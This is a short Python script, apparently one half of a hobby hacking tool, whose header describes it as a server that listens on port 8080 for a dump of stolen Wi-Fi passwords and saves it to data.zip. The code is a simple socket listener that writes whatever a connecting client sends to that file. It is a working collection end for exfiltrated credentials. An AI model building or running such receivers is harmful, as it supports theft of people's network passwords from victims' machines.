'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
#       Author:     Safwan                                                                  #
#       Date:       Friday, 19 February 2021 9:15:13 PM                                     #
#       Brief:      Backend server that will listen at port 8080 for wifi passwords dump    #
#                   and write it to data.zip file.                                          #
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

import socket

HOST = '127.0.0.1'
PORT = 8080


def main():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.bind((HOST, PORT))
            print("[+]"*10)
            print("[+] Waiting for connections")
            sock.listen()
            while True:
                conn, addr = sock.accept()
                print(f"[+] Connected to {addr}")
                with open("data.zip", "wb") as f:
                    data = conn.recv(8000)
                    while data:
                        f.write(data)
                        data = conn.recv(8000)
                print("[+] File downloaded")
                conn.close()
    except Exception as e:
        print(e)
            


main()
